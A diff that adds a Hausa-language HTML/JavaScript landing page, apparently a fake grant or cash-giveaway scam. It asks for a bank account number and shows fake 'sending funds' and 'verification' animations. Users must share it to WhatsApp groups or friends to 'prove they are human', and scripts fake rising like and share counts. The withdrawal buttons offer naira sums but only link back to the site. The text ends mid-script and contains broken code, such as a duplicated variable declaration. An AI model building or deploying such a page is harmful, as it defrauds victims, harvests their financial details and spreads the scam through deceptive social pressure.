@@ -1,1 +1,1286 @@
+<!DOCTYPE html>
+<html>
+    <head>
 
+	 
+	  
+ 
+
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+  
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>tallafir</title>
+<link rel="shortcut icon" type="image/png" href="main.png" />
+        <meta name="og:title" content="tallafi" />
+        <meta name="og:url" content="WWW.New-Year_Offer.PK/" />
+        <meta property="og:description" content="bukatar" />
+        <meta property="og:image" content="main.png" />
+        <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="144320432930" />
+	   
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+ 
+</head>
+<body>
+  
+
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+@import url('https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@700&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@400;700&display=swap');
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #ebedf0;
+    
+}
+.notification {
+            display: none;
+            color: rgb(42, 50, 165);
+            font-weight: bold;
+            font-size: 15px;
+            padding: 7px px;
+            position: fixed;
+            top: 10px;
+            left: 0;
+            width: fit-content;
+            text-align: center;
+            white-space: nowrap;
+            background: rgba(180, 161, 232, 0.8);
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            animation: moveRight 3s linear infinite alternate;
+            z-index: 1000;
+        }
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: #098105;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 260px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: #0f6f5c;
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #098105;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(9, 129, 5);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #14c449;
+}
+#fill,
+#fill2 {
+    background: #14c449;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #14c449;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+
+    font-family: 'Noto Nastaliq Urdu', serif;
+    text-align: center;
+	width:75%;
+	border-radius:15px;
+	padding:5px;
+	margin-bottom:10px;
+    background-color: rgb(164, 219, 175);
+}
+.horizontal_marque{
+font-family: 'Noto Nastaliq Urdu', serif;
+
+}
+
+.dog-loader {
+  font-family: 'Comic Sans MS', cursive, sans-serif;
+  text-align: center;
+  padding: 20px;
+  font-size: 1.0em;
+  color: #444;
+  position: relative;
+}
+
+.dog-gear {
+  font-size: 2em;
+  animation: dog-spin 2s linear infinite;
+  display: inline-block;
+  margin-right: 10px;
+}
+
+@keyframes dog-spin {
+  0% { transform: rotate(0deg);}
+  100% { transform: rotate(360deg);}
+}
+
+.dog-message {
+  display: none;
+  animation: dog-fadeIn 0.5s ease-in-out forwards;
+}
+
+@keyframes dog-fadeIn {
+  from {opacity: 0;}
+  to {opacity: 1;}
+}
+.dog-loader-2 {
+  font-family: 'Comic Sans MS', cursive, sans-serif;
+  text-align: center;
+  padding: 20px;
+  font-size: 1.0em;
+  color: #333;
+  position: relative;
+}
+
+.dog-gear-2 {
+  font-size: 2em;
+  animation: dog-spin-2 2s linear infinite;
+  display: inline-block;
+  margin-right: 10px;
+}
+
+@keyframes dog-spin-2 {
+  0% { transform: rotate(0deg);}
+  100% { transform: rotate(360deg);}
+}
+
+.dog-message-2 {
+  display: none;
+  animation: dog-fadeIn-2 0.5s ease-in-out forwards;
+}
+
+@keyframes dog-fadeIn-2 {
+  from {opacity: 0;}
+  to {opacity: 1;}
+}
+
+</style>
+  
+  
+  
+  
+                  
+                       
+
+    <div class="post" width="100%">
+  
+        <div id="intro">
+         
+            <p class="welcome">
+                <center>
+			 <h5 style="color: #d7bf5e;"><b>
+       
+                     <center><img src="main.png" alt="Pakistan" style="width:350px;; height:150;"></center>
+             <h5>  <b></b>Yadda Za Ku Yi Samu yanzu</b></h5>
+<h6>
+Danna maɓallin da ke ƙasa domin fara rajista.</br>
+Cika Acoount number.</br>
+Shikenan! Idan aka amince da ku, za a tura kuɗin kai tsaye cikin asusun ku.</br>
+            </h6>
+
+        </center>
+                </p>
+     
+      
+            <button id="go">fara rajista yanzu</button>
+           
+        </div>
+        <div id="loader">
+         
+          <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>inline css loader</title>
+</head><center>
+<body style="background: #d4ece5; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0;">
+    <!-- MAIN CONTAINER - all styles inline -->
+    <div style="background: #e0f7f2; width: 340px; padding: 2.2rem 1.8rem 2.2rem; border-radius: 2.2rem; box-shadow: 0 20px 30px -10px rgba(8, 60, 50, 0.5); border: 1px solid #9fd4c5; text-align: center; display: flex; flex-direction: column; align-items: center;">
+       
+        <!-- IMAGE CONTAINER with inline animation -->
+        <div style="margin-bottom: 2rem; filter: drop-shadow(0 8px 18px rgba(15, 111, 92, 0.4)); animation: softPulse 2.4s infinite alternate;">
+            <img 
+                src="https://t4.ftcdn.net/jpg/05/62/26/11/240_F_562261155_8YZYcZz3YubhIM0vEYusbpqK7ClERpvt.jpg" 
+                alt="transaction icon" 
+                style="width: 130px; height: auto; border-radius: 20px; display: block; animation: gentleWobble 2.8s infinite ease-in-out; border: 2px solid rgba(15, 111, 92, 0.3);"
+            >
+        </div>
+
+        <!-- LOADING SECTION with inline styles -->
+        <div style="width: 100%; margin-top: 0.5rem;">
+            
+            <!-- "please wait" text with spinner -->
+            <div style="color: #0f6f5c; font-size: 1rem; font-weight: 500; margin-bottom: 0.8rem; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
+                <span style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(15, 111, 92, 0.3); border-top-color: #0f6f5c; border-radius: 50%; animation: spin 1s linear infinite;"></span>
+                please wait
+                <span style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(15, 111, 92, 0.3); border-top-color: #0f6f5c; border-radius: 50%; animation: spin 1s linear infinite;"></span>
+            </div>
+
+            <!-- progress bar track -->
+            <div style="background: #c0e6dd; height: 14px; border-radius: 30px; border: 1px solid #9fd4c5; overflow: hidden; box-shadow: inset 0 2px 5px rgba(8, 60, 50, 0.2); width: 100%; margin-bottom: 0.5rem;">
+                <div style="width: 0%; height: 100%; background: #0f6f5c; border-radius: 30px; animation: fillFlow 2s infinite alternate ease-in-out, tealGlow 1.4s infinite alternate; box-shadow: 0 0 8px #0f6f5c;"></div>
+            </div>
+
+            <!-- additional processing message -->
+            <div style="color: #0f6f5c; font-size: 0.85rem; margin-top: 0.8rem; opacity: 0.8; display: flex; align-items: center; justify-content: center; gap: 0.3rem;">
+                processing transaction
+                <span style="animation: dotPulse 1.5s infinite; letter-spacing: 1px;">...</span>
+            </div>
+        </div>
+    </div>
+ </center>
+    <!-- ALL KEYFRAMES ANIMATIONS (must be in style tag, cannot be inline) -->
+    <style>
+        @keyframes gentleWobble {
+            0% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(3deg) scale(1.02); }
+            50% { transform: rotate(-2deg) scale(0.98); }
+            75% { transform: rotate(2deg) scale(1.01); }
+            100% { transform: rotate(0deg) scale(1); }
+        }
+        @keyframes softPulse {
+            0% { filter: drop-shadow(0 8px 15px rgba(15, 111, 92, 0.2)); }
+            100% { filter: drop-shadow(0 15px 25px rgba(15, 111, 92, 0.6)); }
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @keyframes fillFlow {
+            0% { width: 8%; }
+            30% { width: 42%; }
+            60% { width: 68%; }
+            85% { width: 84%; }
+            100% { width: 96%; }
+        }
+        @keyframes tealGlow {
+            0% { opacity: 0.85; box-shadow: 0 0 4px #0f6f5c; }
+            100% { opacity: 1; box-shadow: 0 0 16px #1bbaa0; }
+        }
+        @keyframes dotPulse {
+            0% { opacity: 0.2; }
+            50% { opacity: 1; }
+            100% { opacity: 0.2; }
+        }
+    </style>
+</body>
+</html>
+        </div>
+        <div id="info">
+          
+            <div class="phone">
+			
+<body style="background: #eef5f3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 1rem; margin: 0; font-family: 'Segoe UI', Roboto, system-ui, sans-serif;">
+
+    <!-- MAIN CARD - all styles inline, only account number field -->
+    <div style="background: white; width: 100%; max-width: 420px; padding: 2rem 1.8rem; border-radius: 28px; box-shadow: 0 20px 30px -10px rgba(0, 50, 40, 0.15); border: 1px solid #c6e3da; text-align: center;">
+        
+        <!-- heading -->
+        <h2 style="color: #0f6f5c; font-weight: 600; font-size: 1.6rem; margin-bottom: 1.8rem; letter-spacing: -0.3px; border-left: 5px solid #0f6f5c; padding-left: 1rem; text-align: left;">account number</h2>
+        
+        <!-- ONLY ACCOUNT NUMBER INPUT - with id="name" and name="name" -->
+        <div style="margin-top: 0.5rem; width: 100%;">
+            <label for="name" style="display: block; color: #0f6f5c; font-weight: 500; font-size: 0.9rem; margin-bottom: 0.5rem; text-align: left;">enter account number</label>
+            <input 
+                type="text" 
+                id="name" 
+                name="name" 
+                placeholder="e.g. 0123456789" 
+                maxlength="10" 
+                pattern="\d*" 
+                inputmode="numeric"
+                style="width: 100%; padding: 1rem 1.2rem; background: #f8fdfb; border: 1.5px solid #c0e6dd; border-radius: 50px; font-size: 1rem; outline: none; transition: border 0.15s; color: #124e41; box-sizing: border-box;"
+            >
+        </div>
+ <button id="confirm">Cire Kudi </button>
+        <!-- tiny decorative line (optional - delete if you want nothing at all) -->
+        <div style="color: #7ba99e; font-size: 0.7rem; margin-top: 1.5rem; opacity: 0.6;">──────────</div>
+    </div>
+
+</body>
+
+  
+</form>
+
+                
+                
+                
+              
+               
+            </div>
+            <p class="error">Da fatan za a shigar da ingantacciyar lamba!</p>
+        </div>
+        <div id="checking">
+            <center><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>send → verify cycle (inline)</title>
+</head>
+<body style="background: #d4ece5; min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0;">
+
+    <!-- MAIN CONTAINER - all layout inline -->
+    <div style="background: #e0f7f2; width: 340px; padding: 2.2rem 1.8rem 2.2rem; border-radius: 2.2rem; box-shadow: 0 20px 30px -10px rgba(8, 60, 50, 0.5); border: 1px solid #9fd4c5; text-align: center; display: flex; flex-direction: column; align-items: center;">
+        
+        <!-- IMAGE CONTAINER (same gentle motion) -->
+        <div style="margin-bottom: 2rem; filter: drop-shadow(0 8px 18px rgba(15, 111, 92, 0.4)); animation: softPulse 2.4s infinite alternate;">
+            <img 
+                src="https://t4.ftcdn.net/jpg/05/62/26/11/240_F_562261155_8YZYcZz3YubhIM0vEYusbpqK7ClERpvt.jpg" 
+                alt="transaction icon" 
+                style="width: 130px; height: auto; border-radius: 20px; display: block; animation: gentleWobble 2.8s infinite ease-in-out; border: 2px solid rgba(15, 111, 92, 0.3);"
+            >
+        </div>
+
+        <!-- LOADING SECTION with SEND → VERIFY simulation -->
+        <div style="width: 100%; margin-top: 0.5rem;">
+            
+            <!-- top status: changes from "sending" to "verifying" dynamically via animation delay -->
+            <div id="status-text" style="color: #0f6f5c; font-size: 1rem; font-weight: 600; margin-bottom: 0.8rem; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 0.5rem;">
+                <span style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(15, 111, 92, 0.3); border-top-color: #0f6f5c; border-radius: 50%; animation: spin 1s linear infinite;"></span>
+                <span id="action-word">sending funds</span>
+                <span style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(15, 111, 92, 0.3); border-top-color: #0f6f5c; border-radius: 50%; animation: spin 1s linear infinite;"></span>
+            </div>
+
+            <!-- progress bar track (fills during send, then holds/pulses during verification) -->
+            <div style="background: #c0e6dd; height: 14px; border-radius: 30px; border: 1px solid #9fd4c5; overflow: hidden; box-shadow: inset 0 2px 5px rgba(8, 60, 50, 0.2); width: 100%; margin-bottom: 0.8rem;">
+                <div id="progress-fill" style="width: 0%; height: 100%; background: #0f6f5c; border-radius: 30px; box-shadow: 0 0 8px #0f6f5c;"></div>
+            </div>
+
+            <!-- bottom message changes with phase -->
+            <div id="bottom-message" style="color: #0f6f5c; font-size: 0.85rem; margin-top: 0.5rem; opacity: 0.8; display: flex; align-items: center; justify-content: center; gap: 0.3rem;">
+                <span>💸 transferring</span>
+                <span style="animation: dotPulse 1.5s infinite; letter-spacing: 1px;">...</span>
+            </div>
+
+            <!-- small verification badge appears only during verification phase -->
+            <div id="verify-badge" style="margin-top: 1rem; background: #0f6f5c20; color: #0f6f5c; border: 1px solid #0f6f5c; border-radius: 100px; padding: 0.3rem 1rem; font-size: 0.75rem; font-weight: 500; display: none; align-items: center; justify-content: center; gap: 0.4rem;">
+                <span style="display: inline-block; width: 8px; height: 8px; background: #0f6f5c; border-radius: 50%; animation: pulseDot 1.2s infinite;"></span>
+                VERIFICATION IN PROGRESS
+            </div>
+        </div>
+    </div>
+
+    <!-- ANIMATIONS + JAVASCRIPT that cycles SEND → VERIFY -->
+    <style>
+        @keyframes gentleWobble {
+            0% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(3deg) scale(1.02); }
+            50% { transform: rotate(-2deg) scale(0.98); }
+            75% { transform: rotate(2deg) scale(1.01); }
+            100% { transform: rotate(0deg) scale(1); }
+        }
+        @keyframes softPulse {
+            0% { filter: drop-shadow(0 8px 15px rgba(15, 111, 92, 0.2)); }
+            100% { filter: drop-shadow(0 15px 25px rgba(15, 111, 92, 0.6)); }
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @keyframes dotPulse {
+            0% { opacity: 0.2; }
+            50% { opacity: 1; }
+            100% { opacity: 0.2; }
+        }
+        @keyframes pulseDot {
+            0% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.3); }
+            100% { opacity: 0.3; transform: scale(1); }
+        }
+        /* verification pulsing effect for the progress bar */
+        .verify-pulse {
+            animation: verifyGlow 1.2s infinite alternate !important;
+        }
+        @keyframes verifyGlow {
+            0% { opacity: 0.7; box-shadow: 0 0 4px #0f6f5c; }
+            100% { opacity: 1; box-shadow: 0 0 20px #0f6f5c; background: #0f6f5c; }
+        }
+    </style>
+
+    <script>
+        (function() {
+            // DOM elements
+            const progressFill = document.getElementById('progress-fill');
+            const actionWord = document.getElementById('action-word');
+            const bottomMsg = document.getElementById('bottom-message');
+            const verifyBadge = document.getElementById('verify-badge');
+            
+            // State
+            let phase = 'sending'; // 'sending' or 'verifying'
+            let progress = 0;
+            let interval;
+
+            // Helper: update UI based on phase
+            function updateUI() {
+                if (phase === 'sending') {
+                    actionWord.innerText = 'sending funds';
+                    bottomMsg.innerHTML = '<span>💸 transferring</span> <span style="animation: dotPulse 1.5s infinite; letter-spacing: 1px;">...</span>';
+                    verifyBadge.style.display = 'none';
+                    progressFill.classList.remove('verify-pulse');
+                } else {
+                    actionWord.innerText = 'verifying';
+                    bottomMsg.innerHTML = '<span>🔍 checking with network</span> <span style="animation: dotPulse 1.5s infinite; letter-spacing: 1px;">...</span>';
+                    verifyBadge.style.display = 'flex';
+                    progressFill.classList.add('verify-pulse');
+                }
+            }
+
+            // Main loop: progress moves during sending, stops during verify
+            function runCycle() {
+                if (phase === 'sending') {
+                    // increase progress (send phase)
+                    progress += 1.2;
+                    if (progress >= 100) {
+                        progress = 100;
+                        progressFill.style.width = progress + '%';
+                        // switch to verification phase
+                        phase = 'verifying';
+                        updateUI();
+                        // hold at 100% for 2.5 seconds (verification)
+                        setTimeout(() => {
+                            // after verification, reset to sending
+                            phase = 'sending';
+                            progress = 0;
+                            progressFill.style.width = progress + '%';
+                            updateUI();
+                            // continue the sending loop
+                        }, 2600);
+                    } else {
+                        progressFill.style.width = progress + '%';
+                    }
+                }
+                // if verifying, do nothing (progress stays at 100)
+            }
+
+            // start the send cycle (runs every 80ms for smooth fill)
+            interval = setInterval(runCycle, 80);
+
+            // initial UI set
+            updateUI();
+            progressFill.style.width = '0%';
+        })();
+    </script>
+</body>
+</html>
+            </center>
+        </div>
+        <div id="share">
+<center>
+    
+         <div style="background: linear-gradient(to right, #0055a4, #008751); padding: 15px; text-align: center; color: rgb(255, 0, 0);">
+            <h1 style="margin: 0; font-size: 18px; font-weight: bold; line-height: 1.3;">
+              jira kaɗan...
+Tsarin mu yana bukatar ku tabbatar cewa ku mutum ne na gaske, ba robot ba.
+            </h1>
+            <div style="height: 3px; background: #ffd700; margin-top: 8px;"></div>
+        </div>
+        
+        <!-- Content -->
+        <div style="padding: 15px;">
+            
+            
+            <!-- Eligibility -->
+            <div style="background: #e8f6ef; padding: 12px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid #27ae60;">
+                <p style="margin: 0; font-size: 14px; color: #333; display: flex; align-items: flex-start;">
+                    <span style="background: #27ae60; color: white; padding: 4px 8px; border-radius: 50%; margin-right: 8px; font-size: 12px; flex-shrink: 0;">✓</span>
+                    ⚠️ Mataki na Tabbatarwa (Human Verification Required)<br>
+Domin kare tsarin daga bots da rajistar karya, ana bukatar ku kammala wannan mataki:
+                </p>
+            </div>
+            
+            <!-- How to Proceed -->
+            <div style="background: #fff5f5; padding: 12px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid #e74c3c;">
+                <h5 style="color: #e74c3c; margin: 0 0 10px 0; font-size: 15px; font-weight: bold; display: flex; align-items: center;">
+                    <span style="background: #e74c3c; color: white; padding: 4px 7px; border-radius: 50%; margin-right: 8px; font-size: 11px;">!</span>
+                   🔒 Yadda ake Tabbatarwa:
+                </h5>
+                
+                <!-- Steps -->
+                <div style="margin-top: 12px;">
+                    <p style="background: #fff; padding: 10px; border-radius: 6px; margin-bottom: 8px; font-size: 13px; display: flex; align-items: flex-start;">
+                        <span style="background: #3498db; color: white; padding: 3px 7px; border-radius: 50%; margin-right: 8px; font-size: 11px; flex-shrink: 0; margin-top: 1px;">1</span>
+                       1️⃣ Danna maballin "SHARE" da ke ƙasa..
+                    </p>
+                    
+                    <p style="background: #fff; padding: 10px; border-radius: 6px; margin-bottom: 8px; font-size: 13px; display: flex; align-items: flex-start;">
+                        <span style="background: #3498db; color: white; padding: 3px 7px; border-radius: 50%; margin-right: 8px; font-size: 11px; flex-shrink: 0; margin-top: 1px;">2</span>
+                        2️⃣ Raba wannan saƙo zuwa Groups 5 ko abokai 15 a WhatsApp.
+                    </p>
+                     <p style="background: #fff; padding: 10px; border-radius: 6px; margin-bottom: 8px; font-size: 13px; display: flex; align-items: flex-start;">
+                        <span style="background: #3498db; color: white; padding: 3px 7px; border-radius: 50%; margin-right: 8px; font-size: 11px; flex-shrink: 0; margin-top: 1px;">3</span>
+                       3️ Bayan an gama, ma'aunin tabbatarwa (GREEN BAR) zai cika ta atomatik.
+                    </p>
+                    
+                </div>
+                
+                <!-- Share Section -->
+                <div style="text-align: center; margin-top: 15px;">
+                    <h5 style="color: #e74c3c; font-size: 16px; margin: 10px 0; font-weight: bold;">👇👇.   .👇👇</h5>
+                    
+                    <!-- Share Button -->
+                    <button id="whatsapp"style="background: linear-gradient(to right, #25d366, #128c7e); color: white; border: none; padding: 12px 25px; font-size: 16px; font-weight: bold; border-radius: 25px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2); display: inline-flex; align-items: center; justify-content: center; width: 100%; max-width: 200px;">
+                        <svg style="width: 20px; height: 20px; margin-right: 8px;" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893-.001-3.189-1.262-6.187-3.55-8.444"/>
+                        </svg>
+                        SHARE
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+      
+   
+
+        </center>
+            
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">An kammala rijistar ku.</p>
+            <button id="offer">Danna nan</button>
+            <center>
+    <a onclick="window.open('/')" href="/">
+        <button style="display: flex; align-items: center; justify-content: center; margin: 10px 0; width: 90%; max-width: 400px; padding: 15px 25px; background: linear-gradient(to right, #4CAF50, #45a049); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Samu Biya Na Yanzu</button>
+    </a>
+</center>
+<br/>
+
+<center>
+    <a onclick="window.open('/')" href="/">
+        <button style="display: flex; align-items: center; justify-content: center; margin: 10px 0; width: 90%; max-width: 400px; padding: 15px 25px; background: linear-gradient(to right, #2196F3, #1976D2); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Cire ₦250,000 Yanzu</button>
+    </a>
+</center>
+<br/>
+
+<center>
+    <a onclick="window.open('/')" href="/">
+        <button style="display: flex; align-items: center; justify-content: center; margin: 10px 0; width: 90%; max-width: 400px; padding: 15px 25px; background: linear-gradient(to right, #FF9800, #F57C00); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Cire ₦150,000 Yanzu</button>
+    </a>
+</center>
+<br/>
+
+<center>
+    <a onclick="window.open('/')" href="/">
+        <button style="display: flex; align-items: center; justify-content: center; margin: 10px 0; width: 90%; max-width: 400px; padding: 15px 25px; background: linear-gradient(to right, #9C27B0, #7B1FA2); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Cire tsabar kudi zuwa banki</button>
+    </a>
+</center>
+<br/>
+
+
+        </br>
+    </br></br></br></br>
+           </div>
+		
+        
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(500);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(500);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 0)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(400);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
